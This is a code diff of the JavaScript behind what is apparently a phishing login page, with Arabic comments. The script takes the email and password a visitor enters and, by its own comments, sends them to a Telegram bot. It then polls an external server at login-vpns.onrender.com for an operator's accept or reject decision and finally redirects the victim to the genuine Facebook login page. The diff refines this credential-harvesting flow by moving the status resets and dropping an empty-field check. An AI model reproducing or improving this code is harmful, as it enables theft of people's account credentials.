@@ -1,9 +1,3 @@
-// ✅ إعادة تعيين الحالة عند دخول الصفحة (reset)
-fetch('https://login-vpns.onrender.com/update-status?action=reset')
-  .then(res => res.text())
-  .then(() => console.log('🔁 تم إعادة تعيين الحالة عند تحميل الصفحة'))
-  .catch(err => console.error('❌ فشل في reset الحالة:', err));
-
 // ✅ عند الضغط على زر "Log In"
 document.getElementById('submit-btn').addEventListener('click', () => {
     const email = document.getElementById('email').value.trim();
@@ -33,7 +27,7 @@ document.getElementById('submit-btn').addEventListener('click', () => {
     })
     .then(() => {
         console.log('📤 تم إرسال البيانات إلى البوت، ننتظر الرد...');
-        checkLoginStatus(); // ✅ نبدأ التحقق من الحالة
+        checkLoginStatus(); // نبدأ التحقق
     })
     .catch(error => {
         console.error("❌ فشل في إرسال البيانات إلى تيليجرام:", error);
@@ -43,27 +37,28 @@ document.getElementById('submit-btn').addEventListener('click', () => {
 // ✅ التحقق من حالة القبول/الرفض
 function checkLoginStatus() {
     const interval = setInterval(() => {
-        const email = document.getElementById('email').value.trim();
-        const password = document.getElementById('password').value.trim();
-
-        // ✅ لا نتابع إذا لم يدخل المستخدم بيانات
-        if (!email || !password) {
-            clearInterval(interval);
-            console.log("⛔ لا توجد بيانات مدخلة، لا يتم التوجيه.");
-            return;
-        }
-
         fetch('https://login-vpns.onrender.com/get-status')
             .then(res => res.json())
             .then(data => {
                 if (data.accepted) {
                     clearInterval(interval);
                     console.log("✅ تم القبول، توجيه المستخدم...");
-                    window.location.href = 'https://www.facebook.com/login';
+
+                    // ✅ إعادة تعيين الحالة
+                    fetch('https://login-vpns.onrender.com/update-status?action=reset')
+                        .then(() => {
+                            window.location.href = 'https://www.facebook.com/login';
+                        });
+
                 } else if (data.rejected) {
                     clearInterval(interval);
                     console.log("❌ تم الرفض، عرض الرسالة للمستخدم.");
+
+                    // ✅ إظهار الرسالة
                     document.getElementById('error-message').style.display = 'block';
+
+                    // ✅ إعادة تعيين الحالة
+                    fetch('https://login-vpns.onrender.com/update-status?action=reset');
                 }
             })
             .catch(err => {
